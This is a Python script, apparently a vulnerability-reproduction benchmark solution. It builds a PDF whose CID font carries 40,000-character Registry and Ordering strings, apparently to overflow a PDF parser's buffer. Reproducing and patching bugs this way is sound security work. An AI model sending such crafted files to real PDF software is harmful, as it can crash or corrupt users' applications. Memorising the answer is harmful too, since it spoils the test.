class Solution:
    def solve(self, src_path: str) -> bytes:
        long_len = 40000
        long_reg = 'A' * long_len
        long_ord = 'B' * long_len
        reg_str = b'(' + long_reg.encode('ascii') + b')'
        ord_str = b'(' + long_ord.encode('ascii') + b')'
        basefont = b'/SomeFallbackFont'
        header = b'%PDF-1.4\n'
        obj1 = b'1 0 obj\r\n<< /Type /Catalog /Pages 2 0 R >>\r\nendobj\r\n\r\n'
        obj2 = b'2 0 obj\r\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\r\nendobj\r\n\r\n'
        obj3 = b'3 0 obj\r\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\r\nendobj\r\n\r\n'
        contents = b'BT /F1 12 Tf 100 700 Td (Hello) Tj ET\r\n'
        length4 = len(contents)
        obj4 = b'4 0 obj\r\n<< /Length ' + str(length4).encode('ascii') + b' >>\r\nstream\r\n' + contents + b'endstream\r\nendobj\r\n\r\n'
        obj5 = b'5 0 obj\r\n<< /Type /Font /Subtype /Type0 /BaseFont ' + basefont + b' /DescendantFonts [6 0 R] /Encoding /Identity-H >>\r\nendobj\r\n\r\n'
        obj6 = b'6 0 obj\r\n<< /Type /Font /Subtype /CIDFontType2 /BaseFont ' + basefont + b' \r\n/CIDSystemInfo << /Registry ' + reg_str + b' /Ordering ' + ord_str + b' /Supplement 0 >> \r\n/DW 1000 >>\r\nendobj\r\n\r\n'
        body = bytearray()
        body.extend(header)
        offsets = [0] * 7
        offsets[1] = len(body)
        body.extend(obj1)
        offsets[2] = len(body)
        body.extend(obj2)
        offsets[3] = len(body)
        body.extend(obj3)
        offsets[4] = len(body)
        body.extend(obj4)
        offsets[5] = len(body)
        body.extend(obj5)
        offsets[6] = len(body)
        body.extend(obj6)
        xref_pos = len(body)
        xref = b'xref\r\n0 7\r\n'
        for i in range(7):
            off = offsets[i]
            gen = 65535 if i == 0 else 0
            xref += f'{off:010d}'.encode('ascii') + f' {gen:05d}'.encode('ascii') + b' n\r\n'
        trailer = b'trailer\r\n<< /Size 7 /Root 1 0 R >>\r\nstartxref\r\n' + str(xref_pos).encode('ascii') + b'\r\n%%EOF\r\n'
        body.extend(xref)
        body.extend(trailer)
        return bytes(body)
